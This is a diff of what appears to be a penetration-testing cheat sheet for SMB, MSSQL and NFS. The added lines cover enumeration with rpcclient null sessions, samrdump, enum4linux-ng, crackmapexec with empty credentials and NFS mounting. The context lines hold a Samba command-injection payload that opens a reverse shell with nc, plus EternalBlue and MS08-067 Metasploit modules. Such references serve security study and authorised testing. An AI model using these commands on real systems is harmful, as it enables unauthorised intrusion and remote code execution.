@@ -138,12 +138,16 @@ $ smbclient \\\\<IP address>\\c$ -U <username>
 $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
+$ rpcclient -U "" <IP address>
+$ samrdump.py <IP address>		
 msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
 $ enum4linux -a <IP address>
+$ enum4linux-ng.py -A <IP address>	
 $ crackmapexec smb <IP address> --shares
+$ crackmapexec smb <IP address> --shares -u '' -p ''
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
 $ crackmapexec winrm <IP address> -u <username> -p '<password>'
 ```
@@ -186,7 +190,8 @@ SQL> EXEC xp_cmdshell "whoami";
 
 ```
 $ showmount -e <IP address>
-$ sudo mount -t nfs <IP address>:<mountable share> <target location>
+$ sudo mount -t nfs <IP address>:<mountable share> <target location> -o nolock
+$ sudo umount <target location>
 $ sudo useradd -u <UID> <user>
 ```
 
